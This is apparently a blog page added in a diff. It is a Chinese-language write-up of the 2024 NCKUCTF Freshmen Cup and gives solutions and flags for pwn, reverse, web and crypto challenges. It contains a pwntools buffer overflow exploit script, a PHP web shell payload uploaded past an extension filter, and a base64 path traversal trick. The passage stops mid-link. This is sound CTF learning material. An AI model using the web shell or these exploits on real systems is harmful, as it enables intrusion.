+    <div id="welcome--discord" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#welcome--discord" aria-label="定位點">#</a>
+    </span>        
+    
+</h3>
+<p>藏在dc <code>🩸｜迎新盃＆首殺公告</code> 的頻道主題內<br>
+比較<del>機車</del>的點是 基本上要全螢幕才看得到後面的那串描述</p>
+<p>flag: NCKUCTF{Welcome to 2024 NCKUCTF Freshmen Cup!}</p>
+
+
+<h3 class="relative group">Welcome / 回饋表單 
+    <div id="welcome--%E5%9B%9E%E9%A5%8B%E8%A1%A8%E5%96%AE" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#welcome--%E5%9B%9E%E9%A5%8B%E8%A1%A8%E5%96%AE" aria-label="定位點">#</a>
+    </span>        
+    
+</h3>
+<p>請大家去乖乖填表單 甚至只有27個人解完這題</p>
+<p>flag: NCKUCTF{Thanks for your playing, have a nice day!}</p>
+
+
+<h3 class="relative group">Pwn /[新手友善] Overflow Tutorial 
+    <div id="pwn-%E6%96%B0%E6%89%8B%E5%8F%8B%E5%96%84-overflow-tutorial" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#pwn-%E6%96%B0%E6%89%8B%E5%8F%8B%E5%96%84-overflow-tutorial" aria-label="定位點">#</a>
+    </span>        
+    
+</h3>
+<p>考了 <code>integer overflow</code> 還有<code>overwrite data</code>的概念 (應該是叫這個沒錯<br>
+簡單來講就是整數溢出跟複寫<br>
+<del>第二個複寫的部分如果懶得算具體前面要送多少字元的話，可以就直接先無腦噴一堆A，然後再去慢慢縮減就好</del></p>
+<pre tabindex="0"><code>payload: 
+251
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANCKUCTF
+</code></pre><p>flag: NCKUCTF{H0p3_U_LeaRNed_Some_concept_Ab0ut_Sof7w4r3_sEcur1tY_N0w_0a05f6c72945fc781e1a0f5b54dc285a}</p>
+
+
+<h3 class="relative group">Pwn / Every pwner&rsquo;s first challenge 
+    <div id="pwn--every-pwners-first-challenge" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#pwn--every-pwners-first-challenge" aria-label="定位點">#</a>
+    </span>        
+    
+</h3>
+<p>透過<code>buffer overflow</code>來覆蓋 return address 的值，讓他最後變成是回到 call_me function<br>
+找 win function 的話可以用 gdb 的 <code>info func</code> 或是 IDA 直接打開看都可以<br>
+然後具體前面要先送多少字元才能蓋到 ret address 的話可以透過 pwn tool 的 cyclic ，先多送一大堆值進去，再透過GDB來查看報錯時的 $rsp 內容，最後再透過 cyclic_find(&quot;$rsp的值&quot;) 即可找出要覆蓋多少</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;amd64&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">one_gadget</span><span class="p">(</span><span class="n">filename</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;subprocess&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="p">[</span><span class="s1">&#39;one_gadget&#39;</span><span class="p">,</span> <span class="s1">&#39;--raw&#39;</span><span class="p">,</span> <span class="n">filename</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./chal&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="s1">&#39;b *0x401228&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Usage: python3 </span><span class="si">{}</span><span class="s2"> [GDB | REMOTE_IP PORT]&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span>               <span class="p">:</span><span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span>               <span class="p">:</span><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span>  <span class="p">:</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">,</span><span class="n">num</span>           <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">data</span><span class="p">)[</span><span class="o">-</span><span class="n">num</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">,</span><span class="n">num</span>           <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">data</span><span class="p">)[</span><span class="o">-</span><span class="n">num</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span>          <span class="p">:</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">{}</span><span class="s1"> = </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">l64</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">l32</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xf7</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># payload --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">win</span> <span class="o">=</span> <span class="mh">0x401196</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># payload= cyclic(100)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">win</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Welcome to NCKUCTF Freshmen cup!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>flag: NCKUCTF{Y0ur_Pwn_J0urn3y_S74rts_FrOM_noW!_19999da0cf8e994642f89c8015ca5d05}</p>
+
+
+<h3 class="relative group">Reverse / ✌️✊✋ 
+    <div id="reverse--" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#reverse--" aria-label="定位點">#</a>
+    </span>        
+    
+</h3>
+<p>直接執行就有flag了，本來還以為是題目寫爆了?</p>
+<p>flag: NCKUCTF{w0W_yOU_4re_vErY_gooD_47_ROck_PAPeR_5cS50RS!!}</p>
+
+
+<h3 class="relative group">Reverse / Youtube Video Recommendation Tool 
+    <div id="reverse--youtube-video-recommendation-tool" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#reverse--youtube-video-recommendation-tool" aria-label="定位點">#</a>
+    </span>        
+    
+</h3>
+<p>直接strings 查看會輸出的全部yt連接，最後發現其中一個的標題就是flag了</p>
+<p>flag: NCKUCTF{w4I7_a_MiNU73_kaITō_kiddOoa4}</p>
+
+
+<h3 class="relative group">Reverse / Baby Python Assembly 
+    <div id="reverse--baby-python-assembly" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#reverse--baby-python-assembly" aria-label="定位點">#</a>
+    </span>        
+    
+</h3>
+<p>基本上把兩段code都塞給GPT他就會幫你生出原本的list了<br>
+謝謝GPT拯救所有<del>懶得看</del>不會組語的我<br>
+但最好還是去乖乖看組語啦哈哈<br>
+<a href="https://chatgpt.com/share/670d4bb2-26b8-8012-a42b-cec652b95be5"   target="_blank">
+    跟GPT的對話過程</a></p>
+<p>flag: NCKUCTF{baby_pyth0N_1s_s0_EzZzzzzZZzzzzzZzzzz_Vincent55_is_so_Electric_OrzZzZZ_a8b40af05731c9612abeec69772de8e8ca8be759000d272e89f9ea5d413b2477}</p>
+
+
+<h3 class="relative group">Web / 好駭客的網站 
+    <div id="web--%E5%A5%BD%E9%A7%AD%E5%AE%A2%E7%9A%84%E7%B6%B2%E7%AB%99" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#web--%E5%A5%BD%E9%A7%AD%E5%AE%A2%E7%9A%84%E7%B6%B2%E7%AB%99" aria-label="定位點">#</a>
+    </span>        
+    
+</h3>
+<p>簡單來講就是塞web shell，<del>但聽說是題目出爆了才會被簡單繞過</del><br>
+在上傳圖片的部分先透過 <code>burp suite</code> 攔下發送的封包，送到 repeater 中開始修改<br>
+首先會擋掉附檔名為 <code>.php</code> 的內容，但這部分可以變成送 <code>.Php</code> 來繞過<br>
+再來是內容部分不能直接放shell code，前面要先加一段允許格式的Magic Numbers來繞過，這邊我是用gif的<br>
+再來就到上傳圖片的地方後面的cmd加上想執行的指令就可以了</p>
+<blockquote>
+<p><a href="http://chall.nckuctf.org:29103/uploads/aaaa_test.Php?cmd="   target="_blank">
+    http://chall.nckuctf.org:29103/uploads/aaaa_test.Php?cmd=</a>塞這邊</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">payload</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="nx">GIF87a</span> <span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>flag: NCKUCTF{YOu_are_a_g00d_H4cK3r_Just_Lik3_Vincent55_V3ry_N1c3_945dae36ca165274}</p>
+
+
+<h3 class="relative group">Crypto / E? 
+    <div id="crypto--e" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#crypto--e" aria-label="定位點">#</a>
+    </span>        
+    
+</h3>
+<p><del>一樣是靠GPT拿到的exp 這邊直接套原話</del><br>
+你可以使用 <strong>中國餘數定理（CRT）</strong> 來解這個問題，前提是這些 e1 和 e2 是互質的。</p>
+<p>你有兩個方程式：
+c1 = pow(m, e1, n)<br>
+c2 = pow(m, e2, n)<br>
+如果你知道 c1 和 c2 相等，並且知道 e1 和 e2，那麼你可以利用擴展的歐幾里得算法來求解 m。</p>
+<p>利用擴展的歐幾里得算法來找到 s1 和 s2，使得：<br>
+s1 * e1 + s2 * e2 = 1<br>
+根據這個結果，你可以計算出：<br>
+m ≡ (pow(c1, s1, n) * pow(c2, s2, n)) % n<br>
+這樣就能算出 m 的值。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 擴展歐幾里得算法</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">extended_gcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">a</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gcd</span><span class="p">,</span> <span class="n">x1</span><span class="p">,</span> <span class="n">y1</span> <span class="o">=</span> <span class="n">extended_gcd</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">a</span> <span class="o">%</span> <span class="n">b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="n">y1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">y</span> <span class="o">=</span> <span class="n">x1</span> <span class="o">-</span> <span class="p">(</span><span class="n">a</span> <span class="o">//</span> <span class="n">b</span><span class="p">)</span> <span class="o">*</span> <span class="n">y1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">gcd</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 主要解碼邏輯</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="n">c2</span><span class="p">,</span> <span class="n">e1</span><span class="p">,</span> <span class="n">e2</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gcd</span><span class="p">,</span> <span class="n">s1</span><span class="p">,</span> <span class="n">s2</span> <span class="o">=</span> <span class="n">extended_gcd</span><span class="p">(</span><span class="n">e1</span><span class="p">,</span> <span class="n">e2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">gcd</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;e1 和 e2 必須互質&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 如果 s1 是負數，將其轉換為正數</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">s1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="o">-</span><span class="n">s1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="n">s1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 如果 s2 是負數，將其轉換為正數</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">s2</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c2</span><span class="p">,</span> <span class="o">-</span><span class="n">s2</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c2</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c2</span><span class="p">,</span> <span class="n">s2</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 得到原始的 m</span>
+</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="n">c1</span> <span class="o">*</span> <span class="n">c2</span><span class="p">)</span> <span class="o">%</span> <span class="n">n</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">m</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 示例</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">3233</span>  <span class="c1"># 一個模數 n</span>
+</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="mi">42</span>    <span class="c1"># 原始消息</span>
+</span></span><span class="line"><span class="cl"><span class="n">e1</span> <span class="o">=</span> <span class="mi">3</span>    <span class="c1"># 第一個公開指數</span>
+</span></span><span class="line"><span class="cl"><span class="n">e2</span> <span class="o">=</span> <span class="mi">7</span>    <span class="c1"># 第二個公開指數</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 加密得到的密文 c</span>
+</span></span><span class="line"><span class="cl"><span class="n">c1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">e1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">c2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">e2</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 用 c1 和 c2 來解密</span>
+</span></span><span class="line"><span class="cl"><span class="n">解密後的_m</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="n">c2</span><span class="p">,</span> <span class="n">e1</span><span class="p">,</span> <span class="n">e2</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;解密後的消息 m = </span><span class="si">{</span><span class="n">解密後的_m</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></div>
+
+<h2 class="relative group">未解出 
+    <div id="%E6%9C%AA%E8%A7%A3%E5%87%BA" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E6%9C%AA%E8%A7%A3%E5%87%BA" aria-label="定位點">#</a>
+    </span>        
+    
+</h2>
+<p><a href="https://hackmd.io/@IID/ncku-ctf2024i-writeup"   target="_blank">
+    參考Write Up</a></p>
+
+
+<h3 class="relative group">Reverse / 2048?? 
+    <div id="reverse--2048" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#reverse--2048" aria-label="定位點">#</a>
+    </span>        
+    
+</h3>
+<p><del>因為不會用dnspy下斷點查看flag的內容，所以最後還是用CE</del><br>
+透過dnspy查看勝利條件後，可以發現最終目標是要出現數字為2486的方塊，但理論上不可能達成，因此<br>
+<strong>CE 啟動!!</strong>
+慢慢尋找後會發現它儲存的方法是根據每一格位置來存，不是看自己方塊的數字(?)<br>
+例如說左下的格子現在是2，但你把2移走後就會是0<br>
+既然找到內存位置後，再來就只需要把它改成2486就可以了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="o">//</span> <span class="nt">Token</span><span class="o">:</span> <span class="nt">0x0600001C</span> <span class="nt">RID</span><span class="o">:</span> <span class="nt">28</span>
+</span></span><span class="line"><span class="cl"><span class="nt">public</span> <span class="nt">bool</span> <span class="nt">checkGoal</span><span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">for</span> <span class="err">(int</span> <span class="err">i</span> <span class="err">=</span> <span class="err">0</span><span class="p">;</span> <span class="err">i</span> <span class="err">&lt;</span> <span class="err">4</span><span class="p">;</span> <span class="err">i++)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">{</span>
+</span></span><span class="line"><span class="cl">        <span class="err">for</span> <span class="err">(int</span> <span class="err">j</span> <span class="err">=</span> <span class="err">0</span><span class="p">;</span> <span class="err">j</span> <span class="err">&lt;</span> <span class="err">4</span><span class="p">;</span> <span class="err">j++)</span>
+</span></span><span class="line"><span class="cl">        <span class="err">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">if</span> <span class="err">(this.iBoard[i][j]</span> <span class="err">==</span> <span class="err">this.goal)</span>
+</span></span><span class="line"><span class="cl">            <span class="err">{</span>
+</span></span><span class="line"><span class="cl">                <span class="err">return</span> <span class="err">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">}</span>
+</span></span><span class="line"><span class="cl">    <span class="err">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">return</span> <span class="nt">false</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="err">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="nt">Token</span><span class="o">:</span> <span class="nt">0x0400000E</span> <span class="nt">RID</span><span class="o">:</span> <span class="nt">14</span>
+</span></span><span class="line"><span class="cl"><span class="nt">private</span> <span class="nt">int</span> <span class="nt">goal</span> <span class="o">=</span> <span class="nt">2486</span><span class="o">;</span>
+</span></span></code></pre></div><p>flag: NCKUCTF{WHo_I5_RO63R?}</p>
+
+
+<h3 class="relative group">Web / Just Image 
+    <div id="web--just-image" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#web--just-image" aria-label="定位點">#</a>
+    </span>        
+    
+</h3>
+<p>比賽的時候想不到沒有.要怎麼回到根目錄就沒解出來，結果//就可以了qq<br>
+先直接去查看會動的鳥鳥圖片網址，發現最後的格式是base64加密後的，因此我們只需要將目標路徑也base64過後再送過去就好了</p>
+<blockquote>
+<p><a href="http://chall.nckuctf.org:29202/img/Ly9mbGFn"   target="_blank">
